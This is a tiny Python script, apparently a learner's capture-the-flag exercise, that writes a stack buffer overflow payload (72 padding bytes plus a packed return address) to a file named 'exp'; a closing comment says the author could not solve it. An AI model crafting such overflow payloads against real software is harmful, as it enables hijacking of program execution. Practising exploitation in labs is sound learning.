import struct

padding = b"A"*72
padding += struct.pack("I", 0x401156)

f = open("exp", "wb")
f.write(padding)
f.close()

#cannot be able to solve it
